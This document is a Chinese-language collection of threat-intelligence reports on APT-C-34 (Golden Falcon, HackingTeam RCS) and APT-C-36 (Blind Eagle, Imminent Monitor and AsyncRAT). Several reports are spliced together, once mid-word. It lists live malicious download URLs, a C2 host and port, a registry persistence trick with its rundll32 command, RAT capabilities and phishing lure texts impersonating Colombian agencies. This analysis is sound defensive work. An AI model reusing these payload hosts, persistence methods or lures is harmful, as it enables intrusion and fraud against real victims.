从给定的FTP上下载文件并将它们释放到指定目录中；
远程重新配置和更新组件；
接收来自给定FTP的信息，自动将文件解压缩到指定目录；
该后门收集的信息被加密上传到指定的FTP服务器上，相关收集信息在加密的配置文件中，解密后的内容格式如下：
除上述信息收集功能外，其还具备Skype窃听功能，通过调用Skype的接口，实现Skype语音和聊天记录的窃听。
键盘记录模块，通过SetWindowsHookEx函数设置窗口钩子来实现键盘记录，并将截取的键盘信息发送到主程序创建的窗口。
采购HackingTeam商业后门
该组织购买了HackingTeam的远程控制软件Remote Control System（RCS），并有完整的控制端软件，其版本号均为10以上，而HackingTeam在2015年泄露的RCS版本号为9.6。我们发现了该组织使用的HackingTeam相关文件，包括Windows和Android 相应的客户端，以及rcs的控制端。
Windows类型
Rcs的Windows客户端是外界公布的HackingTeam “Soldier”程序，其使用了VMP进行保护，并且使用了证书进行签名。功能上与老版本的HackingTeam 程序相似。
Windows端的C&C信息格式如下：
Country
与老版本的Hacking Team的程序相类似，其写入注册表项进行自启动，注册表位置为：
SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\StartupFolder
项名称为NVIDIAControlPanel
值得注意的是我们还发现了RCS木马离线安装包，将该安装包写入U盘等可引导介质中，当攻击者物理接触到受害者电脑后，能够在系统启动阶段，神不知鬼不觉的将木马植入系统。
该离线安装包不仅支持Windows操作系统，而且还支持Mac OS和Linux系统。
该安装包的版本为10.3.0，远高于2015年泄漏的版本，该安装包能够自动识别操作系统的版本，机器名，用户名等信息，使用界面极为简便。
在安装完成后，Hacking Team木马被安装到配置文件中指定的位置了。重启系统后，木马便开始运行。
下图为Hacking Team离线安装配置文件：
木马在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加开机启动项，启动
%userprofile%\appdata\local\microsoft\文件夹下的InterMgr 0.17.stcz文件。木马在运行后会向其他进程注入线程，以此来达到对抗分析的目的，下图为使用分析工具和Regedit查看启动项的对比。
如果只看0字节的InterMgr 0.17.stcz的文件可能会误导后门无法启动。
但实际结合注册表分析可以得知，木马是劫持了后缀为stcz文件的关联打开方式， HKEY_CLASSES_ROOT.sctz指向了stcz_auto_file。
而从HKEY_CLASSES_ROOT\stcz_auto_file\shell\open\command的值可以知道，InterMgr 0.17.stcz在开机时被打开后会调用rundll32，运行%userprofile%\AppData\Local\Microsoft\yFEO3-9g\目录下的木马dCh8RnL1.Odo。
该处注册表值如下：
%systemroot%\system32\rundll32.exe" %windir%..\Users\ADMINI~1\AppData\Local\MICROS~1\yFEO39g\dCh8RnL1.ODo",fe566ba28K
Android类型
HackingTeam Android 恶意程序中总共使用了17个模块，下面列出各个模块的功能
ModuleChat
获取受感染设备上流行IM应用的聊天记录（包括Facebook Messenger, WhatsApp, Skype, Viber, Line, WeChat, Telegram, BlackBerry Messenger）。
其中C&C地址 185. . .* 与Windows端共用。
关联和归属分析
黄金雕（APT-C-34）组织的基础设施和绝大部分的受害者均集中在哈萨克斯坦国境内，根据受害者的数据推测，该组织的大部分攻击行动主要是针对哈萨克斯坦国境内的情报收集任务，其中也波及到了我国驻哈萨克斯坦境内的机构和人员，支持该组织背后的实体机构疑似与哈萨克斯坦国政府机构存在关联。
与毒针行动的关联
黄金雕（APT-C-34）组织和“毒针”行动背后的APT组织同属于俄语系的APT组织，目前我们没有发现特别的关联，它们可能分别属于不同的APT组织，它们疑似都在同一时期采购了相同版本的HackingTeam网络武器。
公开情报显示， HackingTeam 的windows类型后门的10.3.0版本会伪装为 NVIDIA Control Panel Application 和 MS One Drive程序进行攻击，“毒针”行动使用的HackingTeam后门正是10.3.0版本。而黄金雕（APT-C-34）组织拥有的HackingTeam程序也是同一批次的10.3.0版本。
哈萨克斯坦与HackingTeam
2015年，HackingTeam被攻击泄露数据后，哈萨克斯坦的国家情报机关被证实采购了HackingTeam的软件，曾与HackingTeam官方来往邮件寻求网络武器的技术支持。
从邮件内容看，其中涉及了后门程序因被360杀毒软件查杀而导致目标不上线的案例，疑似是针对中国的攻击：
APT-C-34组织与网络军火商
黄金雕（APT-C-34）组织不仅采购了HackingTeam的网络武器，同时也是著名的移动手机网络军火商 NSO Group的客户。在黄金雕（APT-C-34）的基础设施中，我们还发现了NSO最出名的网络武器pegasus的培训文档，其中还包括与NSO相关的合同信息，采购时间疑似在2018年。依靠pegasus网络武器，黄金雕（APT-C-34）组织应该具备针对Iphone、Android等移动设备使用0day漏洞的高级入侵能力。
APT-C-34组织的技术文档
我们获取到了该组织核心后门程序Harpoon的技术说明文档，该工具被命名为Гарпун（Harpoon），中文实际含义是鱼叉，后门的版本号为5.0。该文档的内容大量引用标注了哈萨克斯坦城市名和哈萨克斯坦政府机构名，疑似该后门程序是由哈萨克斯坦的政府机构支持开发。
关联人物信息
黄金雕（APT-C-34）组织的部分的恶意程序签注了合法的数字签名，我们捕获到的签名如下：
证书 MD5
目前是否有效
至此，360高级威胁应对团队通过关联Hacking Team武器，发现了一支活跃在中亚地区，从未被外界知晓的APT组织黄金雕（APT-C-34）。其间感谢兄弟团队360烽火实验室协助分析了移动部分网络武器。通过我们的报告可以发现，黄金雕（APT-C-34）组织背后的实体机构投入了大量的人力、物力和财力支持其运作，不光自己研发还采购了大量的网络军火武器，种种迹象表明这都不是个人或一般组织能够做到的，这是一支具有高度组织化、专业化的网军力量。同时通过我们的披露，大家可以注意到网络武器军火商脚步也从未停歇，网络军火的交易仍然如火如荼，网络武器日益受到各国的重视，全球各国都会面临巨大的安全威胁。
本文链接： https://blogs.360.cn/post/APT-C-34_Golden_Falcon.html
-- EOF --
admin001
2019-11-20 11:03:55
，添加在分类从2018年4月起至今，一个疑似来自南美洲的APT组织盲眼鹰（APT-C-36）针对哥伦比亚政府机构和大型公司（金融、石油、制造等行业）等重要领域展开了有组织、有计划、针对性的长期不间断攻击。
其攻击平台主要为Windows，攻击目标锁定为哥伦比亚政企机构，截止目前奇安信威胁情报中心一共捕获了29个针对性的诱饵文档，Windows平台木马样本62个，以及多个相关的恶意域名。
2018年4月，奇安信威胁情报中心捕获到第一个针对哥伦比亚政府的定向攻击样本，在此后近一年时间内，我们又先后捕获了多起针对哥伦比亚政企机构的定向攻击。攻击者习惯将带有恶意宏的MHTML格式的Office Word诱饵文档通过RAR加密后配合鱼叉邮件对目标进行投递，然后将RAR解压密码附带在邮件正文中，具有很好的躲避邮件网关查杀的效果。其最终目的是植入Imminent后门以实现对目标计算机的控制，为接下来的横向移动提供基础。
奇安信威胁情报中心通过分析攻击者投递的多个加密的Office Word文档的最后修改时间、MHTML文档字符集（语言环境）、攻击者使用的作者名称等信息，并结合地缘政治等APT攻击的相关要素，判断攻击者疑似来自于UTC时区在西4区（UTC-4）正负1小时对应的地理位置区域（南美洲）。
由于该组织攻击的目标中有一个特色目标是哥伦比亚盲人研究所，而哥伦比亚在足球领域又被称为南美雄鹰，结合该组织的一些其它特点以及奇安信威胁情报中心对 APT 组织的命名规则，我们将该组织命名为盲眼鹰（APT-C-36）。
攻击目标和受害者分析
根据关联到的样本对受害者进行分类统计后，我们发现攻击者主要针对哥伦比亚的政府机构和大型公司，其目的是植入Imminent后门以实现对目标计算机的控制，为接下来的横向移动等攻击行为提供基础。从受害者的背景信息来看，攻击者所关注的政企机构在战略层面有重大意义，同时也不排除其同时有窃取商业机密和知识产权的动机。
伪装来源及行业分布
基于奇安信威胁情报中心对该APT组织的攻击信息统计显示，攻击者伪装成哥伦比亚国家民事登记处、哥伦比亚国家税务和海关总署、哥伦比亚国家统计局、哥伦比亚国家网络警察局、哥伦比亚国家司法部门，对哥伦比亚的政府、金融机构，本国大型企业或跨国公司的哥伦比亚分公司进行攻击，相关信息统计如下。
攻击者使用的部分恶意域名也仿冒了哥伦比亚的政府网站，比如diangovcomuiscia.com从名称上仿冒了muiscia.dian.gov.co，而后者是哥伦比亚税务与海关总署官网。
攻击者对使用的木马程序的公司信息也进行了伪造，相关列表如下：
部分受影响目标
奇安信威胁情报中心在近一年内针对该APT攻击进行监控和关联后发现了其多个用于攻击哥伦比亚政府、金融机构及大型企业的相关邮件。基于对鱼叉邮件的分析，我们列举了如下针对性的诱饵文档以及对应的受害政企。
哥伦比亚国家石油公司
被攻击机构信息及相关邮件
哥伦比亚国家石油公司（ www.ecopetrol.com.co ）主要经营范围包括石油、天然气勘探开发，管线建设以及石油炼制。
攻击哥伦比亚国家石油公司的相关邮件
相关诱饵文档
攻击者伪装成哥伦比亚国家税务和海关总署进行攻击活动：
Dian Embargo Bancario # 609776.doc
哥伦比亚石油公司（Hocol）
被攻击机构信息及相关邮件
Hocol成立于1956年，是哥伦比亚国家石油公司Ecopetrol的子公司，专注于哥伦比亚国内各地的勘探和生产活动。
攻击哥伦比亚石油公司Hocol的相关邮件
相关诱饵文档
攻击者伪装成哥伦比亚国家税务和海关总署进行攻击活动：
estado de cuenta.doc
哥伦比亚物流公司（Almaviva）
被攻击机构信息及相关邮件
Almaviva是一家物流运营商，通过流程和工具的安全管理优化供应链，确保物流运营的效率。
攻击物流公司Almaviva的相关邮件
相关诱饵文档
攻击者伪装成哥伦比亚国家统计局进行攻击活动：
listado de funcionarios autorizados para censo nacional 2018.doc
哥伦比亚国家金融机构（BancoAgrario）
被攻击机构信息及相关邮件
哥伦比亚国家金融机构（BancoAgrario）主要致力于向农村地区提供金融服务。
攻击BancoAgrario的相关邮件
相关诱饵文档
攻击者伪装成哥伦比亚国家网络警察局（caivirtual.policia.gov.co）进行攻击活动
Reporte fraude desde su dirrecion ip.doc
哥伦比亚车轮制造商（IMSA）
被攻击机构信息及相关邮件
IMSA是专业的车轮制造商，致力于使用优质原材料进行车轮制造。
攻击IMSA的相关邮件
相关诱饵文档
攻击者伪装成哥伦比亚国家税务和海关总署（www.dian.gov.co）进行攻击活动
Dian Embargo Bancario # 609776.doc
哥伦比亚银行（Banco de Occidente）
被攻击机构信息
Banco de Occidente是哥伦比亚最大的银行之一，是哥伦比亚Grupo Aval金融服务集团的一部分。
攻击Banco de Occidente的相关邮件
相关诱饵文档
攻击者伪装成哥伦比亚国家司法部门（www.fiscalia.gov.co）进行攻击活动
Citacion Fiscalia general de la Nacion Proceso 305351T.doc
ATH哥伦比亚分部
被攻击机构信息
ATH是一个跨国银行金融机构，在哥伦比亚开设有分部。
攻击ATH哥伦比亚分部相关邮件
相关诱饵文档
攻击者伪装成哥伦比亚国家司法部门（www.fiscalia.gov.co）进行攻击活动
Fiscalia proceso 305351T.doc
Sun Chemical哥伦比亚分部
被攻击机构信息
Sun Chemical是印刷油墨，涂料等用品的跨国企业，同样在哥伦比亚开设有分公司。
攻击Sun Chemical哥伦比亚分公司的邮件
相关诱饵文档
攻击者伪装成哥伦比亚移民权力机构（www.migracioncolombia.gov.co）进行攻击活动
Proceso Pendiente Migracion Colombia.doc
哥伦比亚Byington公司
被攻击机构信息
Byington对哥伦比亚主要的商业公司进行评级和财务评估。
攻击哥伦比亚Byington公司的相关邮件
相关诱饵文档
攻击者伪装成哥伦比亚国家税务和海关总署（www.dian.gov.co）进行攻击活动
estado de cuenta.doc
奇安信威胁情报中心基于该APT组织常见的攻击手法对整个攻击过程进行了详细分析。
最新的一次攻击
2019年2月14日，奇安信威胁情报中心再次监控到该APT组织的最新攻击活动，根据最近捕获到的诱饵文档（MD5：0c97d7f6a1835a3fe64c1c625ea109ed）并没有找到对应的邮件，不过在进行关联调查后，我们发现了另外一个类似的诱饵文档（MD5：3de286896c8eb68a21a6dcf7dae8ec97）及其对应的有针对性攻击邮件（MD5：f2d5cb747110b43558140c700dbf0e5e）。该邮件伪装来自哥伦比亚国家民事登记处，对哥伦比亚国家盲人研究所进行攻击。
最近捕获的诱饵文档，伪装来自哥伦比亚国家民事登记处（MD5：0c97d7f6a1835a3fe64c1c625ea109ed）
攻击哥伦比亚国家盲人研究所的邮件
伪造来源及躲避查杀
攻击者在攻击不同目标时，仔细考虑了如何伪装邮件的来源从而使其看起来更加可信。比如通过伪装民事登记处来攻击盲人研究所，伪装成税务和海关总署来攻击那些有国际贸易的企业，伪装成司法部门和移民权力机构来针对银行和跨国公司哥伦比亚分部等。
攻击者同样对邮件内容进行精心构造，使其看似源自被伪造的机构，且与被攻击者日常工作生活相关。下图为伪装成哥伦比亚国家司法部门对ATH哥伦比亚分部的攻击中对应邮件的内容翻译：
邮件附件被加密存放在压缩包内，并在邮件正文中提供解密密码，用于绕过邮件网关的安全检测。
邮件正文附带RAR密码
对邮件进行分析后，我们发现攻击者在发送邮件时都使用了VPN等方式来隐藏自身，因此尚未能获得发件者的真实IP，只是发现这些邮件通过位于美国佛罗里达州的IDC机房发出，部分相关的IP地址为：
128.90.106.22
128.90.107.21
128.90.107.189
128.90.107.236
128.90.108.126
128.90.114.5
128.90.115.28
128.90.115.179
此次攻击活动诱饵文档均采用MHTML格式的Word文档进行攻击，MHTML格式的Word文档能在一定程度上避免杀毒软件的查杀。例如奇安信威胁情报中心在2019年2月中旬捕获的样本：Registraduria Nacional - Notificacion cancelacion cedula de ciudadania.doc
文档伪装成哥伦比亚国家民事登记处，并利用西班牙语提示受害者开启宏代码，从而执行后续Payload
当受害者打开该MIME文档并启用宏功能后，将自动调用Document_Open函数：
Document_Open首先调用Main函数下载 h xx p://diangovcomuiscia.com/media/a.jpg 并保存为%AppData%\1.exe（md5: ef9f19525e7862fb71175c0bbfe74247）：
接着调用fcL4qOb4函数，设置伪装成Google的计划任务，相关计划任务的信息如下：
释放执行的1.exe为最终的木马后门，该样本为混淆比较严重的C#代码：
去混淆后可以明确看到Imminent Monitor字符串，该样本为Imminent Monitor RAT：
样本运行后首先从资源文件中提取名称为“application”的数据，并解密出一个来自7zip合法的lzma.dll库：
随后从资源文件中提取名称为“_7z的”数据，并利用lzma.dll解压缩该段数据，得到真正的Imminent Monitor RAT样本（MD5: 4fd291e3319eb3433d91ee24cc39102e）：
核心功能分析
该样本包含Imminent Monitor RAT实体功能代码，但采用了ConfuserEx+Eazfuscator.NET双重淆器加密了代码，如下图所示：
部分去混淆后可以看出其提供的功能如下表：
核心模块运行后会检测是否在%temp%\[appname]目录下，如果不在则将自身拷贝为%temp%\[appname]\[appname]，并设置文件属性为隐藏：
然后启动%temp%\[appname]：
最后删除原始文件，并退出进程
样本重新启动后将在%AppData%目录创建Imminent目录，该目录将保存加密后的日志、网络信息、系统信息等文件，当接受到相应指令时发送到服务端：
C&C地址为：mentes.publicvm.com:4050
TTP（战术、技术、过程）
奇安信威胁情报中心总结了该APT组织的TTP如下：
主要攻击战术技术特征分析
1.通过入侵西班牙语网站或者注册有隐私保护的域名并上传用于投放的攻击载荷文件和文档；
2.发送带有MHTML文件格式并包含恶意宏代码的Word文档的鱼叉邮件，并会使用RAR加密诱饵文档以避免邮件网关的查杀；
3.攻击者伪装成哥伦比亚国家民事登记处、哥伦比亚国家税务和海关总署、哥伦比亚国家统计局、哥伦比亚国家网络警察局、哥伦比亚国家司法部门，对哥伦比亚的政府、金融机构，本国大型企业或跨国公司的哥伦比亚分公司进行攻击；
4.使用了商业木马Imminent对目标进行远程控制，并采用了基于动态域名的远程控制技术；
溯源和关联
奇安信威胁情报中心通过分析攻击者投递的多个加密的Office Word文档的最后修改时间、MHTML文档字符集（语言环境）等信息，并结合地缘政治等APT攻击的相关要素，怀疑攻击者来自于UTC时区在西4区（UTC-4）正负1小时对应的地理位置区域。
可靠的文件修改时间
以投递的加密RAR压缩包（Registraduria Nacional del Estado Civil -Proceso inicado.rar）为例，由于RAR会保存文件的修改时间，所以解密RAR包后得到的Word文档的修改时间非常可靠。右边为解密得到的Word文档修改时间，这和左边诱饵文档（MHTML）元信息内包含的文档修改时间一致（由于笔者处于UTC+8时区，需要将文件修改时间减8小时对比）：
通过对比所有加密RAR文件内的诱饵文档修改时间和文档元信息内的文档修改时间，我们有很大的把握确认文档元信息内的修改时间为攻击者的真实修改时间，这样我们可以以捕获到的所有诱饵文档元信息内的修改时间做数据统计。
MHTML诱饵文档修改时间统计
我们统计了所有诱饵文档的修改时间如下表：
从大量样本的修改时间可以看出，从未出现过修改时间在05:30到12:30之间的诱饵文档。基于最合理的推测：正常的休息时间应该在晚12点到早8点之间的区域（睡觉时间段），那么攻击者所处的时区应该在西4区（UTC-4）正负1小时的区间内。
PE时间戳与诱饵文档修改时间对比
我们还统计了木马程序去混淆后dump出来的核心PE文件时间戳信息，与每个对应的诱饵文档修改时间进行对比可以看出：诱饵文档的修改时间与对应的PE文件的时间戳间隔都非常接近，这更加说明了该攻击活动的定向属性：
0c97d7f6a1835a3fe64c1c625ea109ed
Registraduria Nacional - Notificacion cancelacion cedula de ciudadania.doc
27a9ca89aaa7cef1ccb12ddefa7350af
455be8a4210b84f0e93dd96f7a0eec4ef9816d47c11e28cf7104647330a03f6d.bin
3de286896c8eb68a21a6dcf7dae8ec97
egistraduria Nacional del Estado Civil -Proceso inicado.doc
4bbfc852774dd0a13ebe6541413160bb
listado de funcionarios autorizados para censo nacional 2018.doc
a91157a792de47d435df66cccd825b3f
C:\Users\kenneth.ubeda\Desktop\Migracion colombia proceso pendiente 509876.doc
cf906422ad12fed1c64cf0a021e0f764
Migracion colombia Proceso pendiente.doc - copia.nono.txt
e3050e63631ccdf69322dc89bf715667
Citacion Fiscalia general de la Nacion Proceso 305351T.doc
592C9B2947CA31916167386EDD0A4936
censonacionaldepoblacion2018307421e68dd993c4a8bb9e3d5e6c066946ro
A355597A4DD13B3F882DB243D47D57EE
documentoadjuntodian876e68dd993c4a8bb9e3d5e6c066946deudaseptiembre
77FEC4FA8E24D580C4A3E8E58C76A297
procesofiscalia30535120180821e68dd993c4a8bb9e3d5e6c066946se
19487E0CBFDB687538C15E1E45F9B805
centrociberneticoenviosipfraude876e68dd993c4a8bb9e3d5e6c066946octubre
99B258E9E06158CFA17EE235A280773A
fiscaliadocumentos421e68dd993c4a8bb9e3d5e6c066946agosto
B6E43837F79015FD0E05C4F4B2F30FA5
20180709registraduria421e68dd993c4a8bb9e3d5e6c066946r概述 盲眼鹰（APT-C-36）是2019年2月，360威胁情报中心披露的针对哥伦比亚大型政企机构的新APT组织，该组织自2018年，持续发起针对哥伦比亚的攻击活动，该组织通过伪装成与目标受害者业务相关的政府部门对受害者发送钓鱼邮件，诱导其执行带有恶意宏的附件。一旦受害者启用宏，恶意宏代码便会执行，从而拉回Imminent RAT执行，控制受害者计算机。 简略TTP
组织名称 盲眼鹰（APT-C-36）
疑似来源 南美洲国家
攻击目标 哥伦比亚政府机构和大型公司（金融、石油、制造等行业）
攻击手法 伪装为哥伦比亚政府机构进行鱼叉邮件投递
使用后门 Imminent RAT
样本分析 DROPPER
文件名 Denuncia Virtual en su contra.doc（对你的虚拟控告）
MD5 9FB15F35F6C2BA4727CBA53FB95C1179
样本来源 https://app.any.run/tasks/8709d129-7acd-4e5c-81c0-110a3f4751fe
诱饵文档内容如下： 通过对内容图标使用谷歌以图搜图发现，该图标为为哥伦比亚司法部门的图标。 而文件名为翻译为“对你的虚假控告”，因此，小编大胆猜测，此次攻击活动的的邮件内容大致应该是告诉受害者被控告，需查看附件连接详细信息。从而达到诱导受害者执行附件。 宏被加密了，利用olevba可以成功解出宏： 宏与之前的样本类似，从 http://eltiempocomco.com/f.jpg 下载后续木马执行。 Imminent rat 将后续木马下回来，先放在虚拟机里溜溜马： 看行为中的字符串确实是Imminent rat，该样本为商业远控木马,官方的售卖地址：imminentmethods.net，支持的命令功能如下：
ID 功能
bDfBqxDCINCfwSAfMnZwspLefnc 主机管理
ChatPacket 用户支持
cokLfFnjBwgKtzdTpdXSgQIPacR 注册表管理
CommandPromptPacket 远程命令行
ConnectionSocketPacket 网络传输通道管理
ExecutePacket 上传、下载、执行 PE 文件
FastTransferPacket 支持快速传输
FilePacket 文件管理
FileThumbnailGallery 支持文件缩略图库
KeyLoggerPacket 键盘记录
MalwareRemovalPacket 恶意功能管理
MessageBoxPacket 聊天消息
MicrophonePacket 麦克风聊天
MouseActionPacket 鼠标动作
MouseButtonPacket 鼠标左、右、掠过等
NetworkStatPacket 主机网络管理
PacketHeader 通信数据头信息
PasswordRecoveryPacket 浏览器密码恢复
PluginPacket 插件管理
ProcessPacket 进程管理
ProxyPacket 代理管理（反向代理等）
RDPPacket 提供远程桌面功能
RegistryPacket 注册表操作
RemoteDesktopPacket 标志远程桌面数据包
ScriptPacket 执行脚本（ html 、 vbs 、 batch ）
SpecialFolderPacket Windows 特殊文件夹
StartupPacket 启动项操作
TcpConnectionPacket TCP 刷新及关闭
ThumbnailPacket 缩略图相关
TransferHeader 通信连接操作
WebcamPacket 网络摄像头相关启明星辰ADLab实验室在近几个月内，接连捕获到多起针对哥伦比亚国家的政府部门，金融、银行、保险等行业及卫生和制药机构发起的钓鱼邮件定向攻击。攻击者以“冠状病毒检测紧急告知单”或“刑事诉讼通知单”等命名的诱饵文档作为邮件附件，并配合鱼叉邮件向攻击目标电脑植入远控木马。从邮件分析结果来看，攻击者会将邮件的来源伪装成哥伦比亚国家卫生部、国家税务和海关总署、民事身份登记处、检察院以及移民局等政府部门，以加强其邮件的真实性。我们通过对攻击者伪装的来源信息、域名使用偏好、IP地址关联及地理位置等特性进行对比分析，发现该系列攻击来源于盲眼鹰组织，但采用的攻击武器较以往完全不同。盲眼鹰首次被披露于2019年初，是一个疑似来自南美洲的APT组织，其最早活跃时间可追溯到2018年，主要针对哥伦比亚政府和大型公司进行攻击。
在对攻击活动深入分析后，我们发现该组织在我们发现的这批攻击中采用了更为先进攻击技术和反追踪技术。在以往的攻击中，该组织多使用MHTML格式的恶意文档作为攻击附件，而在本次攻击过程中，该黑客组织使用一个无恶意的文档作为媒介，诱使目标下载文档中提供的恶意短链接（该短链接指向一个加密过MHTML的恶意文档），这大大提高攻击的有效性，其不仅能够绕过邮件安全防护系统和入侵检测系统，而且大大的降低了被杀毒软件查杀的概率（我们捕获的许多样本在VT上的查杀率均0，部分样本也长期保持着低于5%的极低查杀率）；我们发现的这批攻击中，该黑客组织放弃了以往常用的ImminentMonitor RAT，采用了一款隐蔽能力和免杀能力更强的RAT--AsyncRAT，同时结合复杂多层加密与代码嵌套手段来提供反分析能力和反检测能力。
AsyncRAT是来源于国外的一款远控木马，其除了能够对目标进行最基本的远程间谍活动外，还可使用USB设备突破物理隔离、使用bot killer清除目标上的竞争对手等。该木马最具特点的是采用不落地的无害模块作为目标的僵尸进程， 并采用“propelling in use，destroy after use”的工作模式，即分解攻击任务为子任务，每个子任务以一个单独的DLL模块来实现，黑客执行任务时由多个子任务DLL模块按照一定的执行序列来实现，同时对完成任务的模块进行及时销毁。这种工作模式将一个完整恶意任务分解成多个无害的子任务，能够有效地躲避一些复杂安全防护策略，同时也能有效地防止取证分析人员获取其核心攻击模块。
此外，该黑客组织还采用了“DoubleFlux+Fast VPN”技术来达到反追踪和反侦测的目的。我们通过对攻击者使用的C&C基础设施进行分析发现，这批攻击的C&C域名是通过DNSExit.com来动态分派IP地址(IP地址是动态变化的，几乎都归属于哥伦比亚的ISP)。实际上，DNSExit不仅是一个“1(dns)对n(IP)”的服务，更是一个“m(dns)对n(IP)”，因此其应该采用了“double flux”技术来规避溯源与追踪。不仅如此，黑客组织使用这种服务的背后还加了一层VPN，也就是说通过“Double Flux”得到的IP地址并不是黑客真正的IP地址，其只是一系列的VPN节点(节点的IP地址由Unus.Ins服务商提供)，因此借用”fastflux”命名法我们将这种反追踪技术称为”Fast VPN”。攻击者利用“Double Flux+Fast VPN”技术来作为攻击载荷和木马回连的通道，使得黑客的攻击变得非常难以追踪和溯源。
二、攻击活动分析
本章总结了黑客组织近期的攻击活动事件以及本次活动中使用的攻击手法。
2.1近期攻击活动
启明星辰ADLab实验室基于原始线索对黑客组织本次的攻击活动进行了全面追踪、关联和分析，发现此次活动最早可追溯到2019年9月，且近期活动主要以COVID-19相关内容作为钓鱼诱饵。我们综合所有的威胁情报数据，梳理了本次该组织发起的所有攻击事件，并绘制出以下攻击事件时间线。
图2-1 APT组织近期攻击事件时间线
2.2攻击手法
在本次攻击活动中，我们发现盲眼鹰APT组织主要采用鱼叉邮件作为初期攻击方式。攻击者伪装成来自哥伦比亚卫生部、哥伦比亚国家总检察院、哥伦比亚移民局、哥伦比亚国家税务和海关总署以及哥伦比亚民事身份登记处等部门，向使用西班牙语言的南美地区（特别是哥伦比亚国家）的政府部门，金融、银行、保险等公司，以及卫生和制药机构的相关人员投递恶意攻击邮件。邮件主题均与攻击者所仿冒的政府部门文件题材相关，并在邮件正文添加针对附件文件的诱导性描述和附件查看密码等信息，更有利于加强邮件的真实性，诱使受害者启用恶意宏代码，进而向攻击目标机器上植入木马程序，以实施对入侵设备的远程控制、窃取机密数据、系统破坏等恶意行为。
启明星辰ADLab实验室通过对该组织近期攻击的监测和关联分析，发现了多个与其相关的邮件，下面我们列举出部分邮件内容以及针对性的诱饵文档。
2.2.1 钓鱼邮件详情
伪装成哥伦比亚卫生部：
（1）图2-2是攻击者伪装成哥伦比亚卫生部的攻击邮件之一。邮件主题为“Ustedha sido citado para una prueba obligatoria de (COVID-19)”（翻译后为：“您被要求参加强制性检测（COVID-19）”）。
图2-2 伪装成哥伦比亚卫生部邮件之一
（2）图2-3是攻击者伪装成哥伦比亚卫生部的攻击邮件之二。邮件主题为“Lehemos llamado en repetidas ocaciones y no ha sido posible contactarle por favorleer comunicado urgente”（翻译后为：“我们已经多次致电给您，无法联系到您，请阅读紧急通知”）。
（3）图2-4是攻击者伪装成哥伦比亚卫生部的攻击邮件之三。邮件主题为“Detectamos en su sector la presencia de COVID-19 ( Corona virus ) intentamos comunicarnos via telefonica con usted”（翻译后为：“我们在您的部门发现了COVID-19( Corona virus )，并尝试通过电话与您联系”）。
伪装成哥伦比亚国家税务和海关总署：
图2-5是攻击者伪装成哥伦比亚国家税务和海关总署的攻击邮件。邮件主题为“Procederemos con una orden de embargo a las cuentas bancariasencontradas a su nombre”（翻译后为：“我们将对以您名义发现的银行账户发出冻结令”）。
图2- 5 伪装成哥伦比亚国家税务和海关总署的邮件
伪装成哥伦比亚民事身份登记处：
图2-6是攻击者伪装成哥伦比亚民事身份登记处的攻击邮件。邮件主题为“Sucedula de ciudadania ha sido reportada como robada en nuestro sistema”（翻译后为：“您的公民证已在我们的系统报失”）。
图2-6 伪装成哥伦比亚民事身份登记处的邮件
伪装成哥伦比亚检察院：
图2-7是攻击者伪装成哥伦比亚检察院的攻击邮件。邮件主题为“El presentees el requerimiento enviado a declarar por el proceso iniciado en su contra(ultimo aviso)”（翻译后为：“这是针对您发起的处理流程声明（最后通知）”）。
图2-7 伪装成哥伦比亚检察院的邮件
伪装成哥伦比亚移民局：
图2-8是攻击者伪装成哥伦比亚移民局的攻击邮件。邮件主题为“Comunicado710297647: Proceso Penal Pendiente”（翻译后为：“声明710297647：待定刑事诉讼法”）。
图2 - 8 伪装成哥伦比亚移民局的邮件
2.2.2 诱饵文档
根据现有的情报分析表明，该组织以往最常用的邮件附件是带有恶意宏的MHTML格式的DOC文档。我们对近期捕获到的相关攻击样本进行分析后，发现在大多数情况下，攻击者开始使用带有短链接的RTF或PDF文档来作为恶意附件，以绕过邮箱网关的检测。表2-1列出了黑客组织在此次攻击活动中使用的恶意文档信息。
citacion prueba covid.pdf
2020-07-09 11:06:40
citacion prueba covid.pdf
2020-06-19 14:11:05
Comunicado.pdf
2020-04-25 13:11:38
minsaludcomunicado.pdf
2020-03-04 22:17:40
estado de cuenta.pdf
2020-02-25 21:58:29
reactivar mi cedula.pdf
2020-02-03 23:18:38
DIAN estado de cuenta.rtf
2019-11-04 15:01:00
pdfproceso.rtf
2019-10-25 14:09:00
Proceso.rtf
2019-08-26 21:00:00
表2-1 相关恶意文档信息
（1）案例1
附件RTF文档中内嵌一个名为“VER PROCESO”的跳转链接，其指向的恶意链接使用的是IP Logger短链接服务。
图2-9 RTF文档内容
图2-10 IP Logger短链接平台
（2）案例2
附件PDF文档中内嵌一个名为“Ver comunicado”的跳转链接和一行文本信息（仅用于提升文档的可信度）。其指向的恶意链接使用的是Acortarurl短链接服务。
图2-11 PDF文档内容
三、溯源与关联分析
在对本次攻击样本的IOC进行深入追踪溯源后，我们挖掘出黑客组织更多的C2服务器信息。后文，我们将结合目前掌握的情报数据和公开的研究报告资料信息，来对此次攻击事件进行详细的组织关联分析。
3.1C&C基础设施分析
通过提取和关联所有样本中的C&C服务器相关信息，我们发现黑客组织所使用的基础设施都位于哥伦比亚、哥斯达黎加和巴拿马，所有IP都归属于哥伦比亚的ISP。查看这些IP的具体信息（如图3-1）可以看到，此IP段的网络服务提供商是Unus.Ins公司，该公司操控着26209个IP地址，且几乎所有这些IP地址都是提供给匿名VPN服务使用，例如Powerhouse Management.Inc（phmgmt.com）。由于该ISP在网络中的流量大多数具有欺诈性，因此美国反欺诈安全公司Scamalytics将其标注为高欺诈风险ISP（如图3-2）。
图3- 1 相关IP具体信息
图3 -2 Scamalytics公司标注信息
该组织使用的域名是在国外DNSExit.com平台上免费注册的三级子域（该平台提供的免费域实际上是二级域，如图3-4），且这些子域所指向的IP地址被频繁的更换（如图3-5）。如果一个C2服务器被关闭，攻击者则可以快速地更新DNS记录指向新服务器，恢复连接。攻击者利用域名注册商提供的DNS服务（double flux），再配合使用VPN服务（fast VPN）作为攻击载荷和木马回连的通道，以达到反追踪和反侦测的目的。
图3-4 DNSExit.com平台
我们从本次事件中黑客组织所使用的样本、C&C服务器等层面进行了关联分析，并结合该组织早期攻击活动中的相关特性，得出以下几处重要的关联点。
3.2.1 伪装来源信息
